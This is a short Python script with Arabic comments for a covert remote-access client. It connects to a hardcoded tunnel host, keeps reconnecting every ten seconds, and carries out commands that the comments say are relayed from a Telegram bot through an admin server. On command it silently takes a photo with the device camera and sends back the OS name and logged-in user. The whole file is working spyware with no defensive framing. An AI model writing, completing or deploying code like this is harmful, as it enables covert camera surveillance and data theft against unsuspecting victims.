import socket
import os
import cv2 # لسحب الصور من الكاميرا
import time

# --- بيانات الاتصال من صورتك (Localtonet) ---
REMOTE_HOST = "9epwao3cw.localto.net"
REMOTE_PORT = 5482

def connect_to_admin():
    while True:
        try:
            # إنشاء الاتصال
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((REMOTE_HOST, REMOTE_PORT))
            
            while True:
                # استقبال الأوامر من بوت التلجرام (عبر سيرفر الأدمن)
                command = client.recv(1024).decode()
                
                if command == "shot":
                    # كود التقاط صورة سريعة من الكاميرا الأمامية
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    if ret:
                        cv2.imwrite("snap.jpg", frame)
                        # هنا يتم إرسال الصورة للأدمن (تحتاج دالة إرسال ملفات)
                        client.send(b"DONE: Image Captured")
                    cap.release()
                
                elif command == "info":
                    # جلب معلومات الجهاز
                    info = f"OS: {os.name}\nUser: {os.getlogin()}"
                    client.send(info.encode())
                
                elif not command:
                    break
        except:
            # في حال انقطع الاتصال، يحاول العودة كل 10 ثواني
            time.sleep(10)
            continue

if __name__ == "__main__":
    connect_to_admin()
